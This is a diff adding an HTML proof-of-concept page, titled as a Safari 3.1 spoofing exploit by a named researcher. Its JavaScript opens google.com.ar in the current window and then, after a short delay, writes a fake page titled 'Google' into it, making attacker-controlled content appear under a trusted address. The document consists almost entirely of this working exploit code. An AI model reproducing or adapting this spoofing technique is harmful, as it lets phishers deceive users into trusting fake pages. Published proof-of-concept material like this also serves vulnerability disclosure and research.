@@ -1,0 +1,35 @@
+&lt;html&gt;
+
+Safari browser 3.1 (525.13) spoofing by Juan Pablo Lopez Yacubian
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Recipe 6.6&lt;/title&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+var newWindow;
+function makeNewWindow() {
+    if (!newWindow || newWindow.closed) {
+        newWindow = window.open(&#039;http://www.google.com.ar/&#039;,&#039;_self&#039;);
+        setTimeout(&quot;writeToWindow()&quot;, 50);
+
+    } else if (newWindow.focus) {
+        newWindow.focus();
+    }
+}
+function writeToWindow() {
+    var newContent = &quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Google&lt;/title&gt;&lt;/head&gt;&quot;;
+    newContent += &quot;&lt;body&gt;
+&lt;h1&gt;FAKE PAGE&lt;/h1&gt;&quot;;
+    newWindow.document.write(newContent);
+     newWindow.document.close();
+  
+}
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form&gt;
+&lt;input type=&quot;button&quot; value=&quot;test spoof!&quot; onclick=&quot;makeNewWindow();&quot;/&gt;
+
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
